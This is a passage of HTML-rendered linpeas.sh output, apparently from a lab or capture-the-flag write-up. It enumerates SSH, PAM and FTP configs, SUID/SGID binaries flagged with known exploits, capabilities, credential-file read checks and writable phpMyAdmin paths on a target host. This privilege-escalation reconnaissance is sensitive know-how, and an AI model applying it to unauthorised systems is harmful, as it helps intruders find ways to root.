class="string">/etc/ssl/certs/CA_Disig_Root_R2.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/CFCA_EV_ROOT.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/COMODO_Certification_Authority.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/COMODO_ECC_Certification_Authority.pem</span></span><br><span class="line"><span class="string">2431PSTORAGE_CERTSBIN</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">══╣ Some home ssh config file was found</span></span><br><span class="line"><span class="string">/usr/share/openssh/sshd_config                                                                                                </span></span><br><span class="line"><span class="string">ChallengeResponseAuthentication no</span></span><br><span class="line"><span class="string">UsePAM yes</span></span><br><span class="line"><span class="string">X11Forwarding yes</span></span><br><span class="line"><span class="string">PrintMotd no</span></span><br><span class="line"><span class="string">AcceptEnv LANG LC_*</span></span><br><span class="line"><span class="string">Subsystem       sftp    /usr/lib/openssh/sftp-server</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">══╣ /etc/hosts.allow file found, trying to read the rules:</span></span><br><span class="line"><span class="string">/etc/hosts.allow                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Searching inside /etc/ssh/ssh_config for interesting info</span></span><br><span class="line"><span class="string">Host *</span></span><br><span class="line"><span class="string">    SendEnv LANG LC_*</span></span><br><span class="line"><span class="string">    HashKnownHosts yes</span></span><br><span class="line"><span class="string">    GSSAPIAuthentication yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing PAM Auth Files (limit 70)</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /etc/pam.d                                                                           </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2133 Jan 31  2020 /etc/pam.d/sshd</span></span><br><span class="line"><span class="string">account    required     pam_nologin.so</span></span><br><span class="line"><span class="string">session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close</span></span><br><span class="line"><span class="string">session    required     pam_loginuid.so</span></span><br><span class="line"><span class="string">session    optional     pam_keyinit.so force revoke</span></span><br><span class="line"><span class="string">session    optional     pam_motd.so  motd=/run/motd.dynamic</span></span><br><span class="line"><span class="string">session    optional     pam_motd.so noupdate</span></span><br><span class="line"><span class="string">session    optional     pam_mail.so standard noenv # [1]</span></span><br><span class="line"><span class="string">session    required     pam_limits.so</span></span><br><span class="line"><span class="string">session    required     pam_env.so # [1]</span></span><br><span class="line"><span class="string">session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale</span></span><br><span class="line"><span class="string">session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Keyring Files (limit 70)</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /usr/share/keyrings                                                                  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching uncommon passwd files (splunk)</span></span><br><span class="line"><span class="string">passwd file: /etc/pam.d/passwd                                                                                                </span></span><br><span class="line"><span class="string">passwd file: /etc/passwd</span></span><br><span class="line"><span class="string">passwd file: /usr/share/bash-completion/completions/passwd</span></span><br><span class="line"><span class="string">passwd file: /usr/share/lintian/overrides/passwd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Github Files (limit 70)</span></span><br><span class="line"><span class="string">drwxr-xr-x 3 root root 4096 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.github                                </span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 Oct 15  2020 /usr/share/phpmyadmin/vendor/phpmyadmin/motranslator/.github</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 Oct 15  2020 /usr/share/phpmyadmin/vendor/tecnickcom/tcpdf/.github</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing PGP-GPG Files (limit 70)</span></span><br><span class="line"><span class="string">gpg Not Found                                                                                                                 </span></span><br><span class="line"><span class="string">netpgpkeys Not Found                                                                                                          </span></span><br><span class="line"><span class="string">netpgp Not Found                                                                                                              </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8700 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8709 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2453 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8132 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8141 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2332 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7443 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7452 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2263 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8700 Mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8709 Mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2453 Mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8132 Mar 16  2021 /usr/share/keyrings/debian-archive-buster-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8141 Mar 16  2021 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2332 Mar 16  2021 /usr/share/keyrings/debian-archive-buster-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 55625 Mar 16  2021 /usr/share/keyrings/debian-archive-keyring.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 36873 Mar 16  2021 /usr/share/keyrings/debian-archive-removed-keys.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7443 Mar 16  2021 /usr/share/keyrings/debian-archive-stretch-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7452 Mar 16  2021 /usr/share/keyrings/debian-archive-stretch-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2263 Mar 16  2021 /usr/share/keyrings/debian-archive-stretch-stable.gpg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Postfix Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 675 Mar  1  2019 /usr/share/bash-completion/completions/postfix                                        </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing FTP Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 5851 May 29  2021 /etc/vsftpd.conf                                                                     </span></span><br><span class="line"><span class="string">anonymous_enable=YES</span></span><br><span class="line"><span class="string">local_enable=YES</span></span><br><span class="line"><span class="string">#write_enable=YES</span></span><br><span class="line"><span class="string">#anon_upload_enable=YES</span></span><br><span class="line"><span class="string">#anon_mkdir_write_enable=YES</span></span><br><span class="line"><span class="string">#chown_uploads=YES</span></span><br><span class="line"><span class="string">#chown_username=whoever</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 41 Jun 18  2015 /usr/lib/tmpfiles.d/vsftpd.conf</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 506 Mar  6  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE/vsftpd.conf</span></span><br><span class="line"><span class="string">anonymous_enable</span></span><br><span class="line"><span class="string">local_enable</span></span><br><span class="line"><span class="string">write_enable</span></span><br><span class="line"><span class="string">anon_upload_enable</span></span><br><span class="line"><span class="string">anon_mkdir_write_enable</span></span><br><span class="line"><span class="string">anon_other_write_enable</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 564 Mar  6  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE_NOINETD/vsftpd.conf</span></span><br><span class="line"><span class="string">anonymous_enable</span></span><br><span class="line"><span class="string">local_enable</span></span><br><span class="line"><span class="string">write_enable</span></span><br><span class="line"><span class="string">anon_upload_enable</span></span><br><span class="line"><span class="string">anon_mkdir_write_enable</span></span><br><span class="line"><span class="string">anon_other_write_enable</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 260 Feb  1  2008 /usr/share/doc/vsftpd/examples/VIRTUAL_USERS/vsftpd.conf</span></span><br><span class="line"><span class="string">anonymous_enable</span></span><br><span class="line"><span class="string">local_enable=YES</span></span><br><span class="line"><span class="string">write_enable</span></span><br><span class="line"><span class="string">anon_upload_enable</span></span><br><span class="line"><span class="string">anon_mkdir_write_enable</span></span><br><span class="line"><span class="string">anon_other_write_enable</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 69 Feb 13  2021 /etc/php/7.3/mods-available/ftp.ini</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 69 Feb 13  2021 /usr/share/php7.3-common/common/ftp.ini</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing DNS Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 856 Mar  1  2019 /usr/share/bash-completion/completions/bind                                           </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 856 Mar  1  2019 /usr/share/bash-completion/completions/bind</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Windows Files (limit 70)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root 22 May 29  2021 /etc/alternatives/my.cnf -&gt; /etc/mysql/mariadb.cnf</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root 24 May 29  2021 /etc/mysql/my.cnf -&gt; /etc/alternatives/my.cnf</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 83 May 29  2021 /var/lib/dpkg/alternatives/my.cnf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Other Interesting Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc                                                                    </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                      ╔════════════════════════════════════╗</span></span><br><span class="line"><span class="string">══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                            </span></span><br><span class="line"><span class="string">                      ╚════════════════════════════════════╝                                                                  </span></span><br><span class="line"><span class="string">╔══════════╣ SUID - Check easy privesc, exploits and write perms</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              </span></span><br><span class="line"><span class="string">strings Not Found                                                                                                             </span></span><br><span class="line"><span class="string">strace Not Found                                                                                                              </span></span><br><span class="line"><span class="string">-rwsr-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                     </span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  ---&gt;  SuSE_9.3/10</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  ---&gt;  HP-UX_10.20</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  ---&gt;  BSD/Linux(08-1996)</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                      </span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ SGID</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              </span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /usr/sbin/unix_chkpwd                                                               </span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root tty 15K May  4  2018 /usr/bin/bsd-write</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root tty 35K Jan 10  2019 /usr/bin/wall</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root crontab 43K Oct 11  2019 /usr/bin/crontab</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root mail 19K Dec  3  2017 /usr/bin/dotlockfile</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root shadow 71K Jul 27  2018 /usr/bin/chage</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root ssh 315K Jan 31  2020 /usr/bin/ssh-agent</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Checking misconfigurations of ld.so</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                                                      </span></span><br><span class="line"><span class="string">/etc/ld.so.conf                                                                                                               </span></span><br><span class="line"><span class="string">Content of /etc/ld.so.conf:                                                                                                   </span></span><br><span class="line"><span class="string">include /etc/ld.so.conf.d/*.conf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/ld.so.conf.d</span></span><br><span class="line"><span class="string">  /etc/ld.so.conf.d/libc.conf                                                                                                 </span></span><br><span class="line"><span class="string">  - /usr/local/lib                                                                                                            </span></span><br><span class="line"><span class="string">  /etc/ld.so.conf.d/x86_64-linux-gnu.conf</span></span><br><span class="line"><span class="string">  - /usr/local/lib/x86_64-linux-gnu                                                                                           </span></span><br><span class="line"><span class="string">  - /lib/x86_64-linux-gnu</span></span><br><span class="line"><span class="string">  - /usr/lib/x86_64-linux-gnu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/ld.so.preload</span></span><br><span class="line"><span class="string">╔══════════╣ Capabilities                                                                                                     </span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                               </span></span><br><span class="line"><span class="string">══╣ Current shell capabilities                                                                                                </span></span><br><span class="line"><span class="string">CapInh:  0x0000000000000000=                                                                                                  </span></span><br><span class="line"><span class="string">CapPrm:  0x0000000000000000=</span></span><br><span class="line"><span class="string">CapEff:  0x0000000000000000=</span></span><br><span class="line"><span class="string">CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span></span><br><span class="line"><span class="string">CapAmb:  0x0000000000000000=</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">══╣ Parent process capabilities</span></span><br><span class="line"><span class="string">CapInh:  0x0000000000000000=                                                                                                  </span></span><br><span class="line"><span class="string">CapPrm:  0x0000000000000000=</span></span><br><span class="line"><span class="string">CapEff:  0x0000000000000000=</span></span><br><span class="line"><span class="string">CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span></span><br><span class="line"><span class="string">CapAmb:  0x0000000000000000=</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Files with capabilities (limited to 50):</span></span><br><span class="line"><span class="string">/usr/bin/ping = cap_net_raw+ep</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ AppArmor binary profiles</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 3129 Feb 10  2019 usr.bin.man                                                                          </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root  730 Nov 25  2020 usr.sbin.mysqld</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Files with ACLs (limited to 50)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                       </span></span><br><span class="line"><span class="string">files with acls in searched folders Not Found                                                                                 </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Files (scripts) in /etc/profile.d/</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                             </span></span><br><span class="line"><span class="string">total 20                                                                                                                      </span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Permissions in init, init.d, systemd, and rc.d</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                               </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">═╣ Hashes inside passwd file? ........... No</span></span><br><span class="line"><span class="string">═╣ Writable passwd file? ................ No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Credentials in fstab/mtab? ........... No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I read shadow files? ............. No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I read shadow plists? ............ No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I write shadow plists? ........... No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I read opasswd file? ............. No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I write in network-scripts? ...... No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I read root folder? .............. No                                                                                  </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Searching root files in home dirs (limit 30)</span></span><br><span class="line"><span class="string">/home/                                                                                                                        </span></span><br><span class="line"><span class="string">/root/</span></span><br><span class="line"><span class="string">/var/www</span></span><br><span class="line"><span class="string">/var/www/html</span></span><br><span class="line"><span class="string">/var/www/html/index.html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching folders owned by me containing others files on it (limit 100)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Readable files belonging to root and readable by me but not world readable</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                             </span></span><br><span class="line"><span class="string">/dev/mqueue                                                                                                                   </span></span><br><span class="line"><span class="string">/dev/shm</span></span><br><span class="line"><span class="string">/run/lock</span></span><br><span class="line"><span class="string">/run/lock/apache2</span></span><br><span class="line"><span class="string">/tmp</span></span><br><span class="line"><span class="string">/tmp/linpeas.sh</span></span><br><span class="line"><span class="string">/var/cache/apache2/mod_cache_disk</span></span><br><span class="line"><span class="string">/var/lib/php/sessions</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/15</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/21</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/22</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/28</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/2e</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/31</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/36</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/3b</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/41</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/42</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/43</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4c</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4e</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4f</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/53</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/5c</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/61</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/6b</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/6c</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/73</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/78</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/7d</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/7f</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/8a</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/8b</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/96</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/97</span></span><br><span class="line"><span 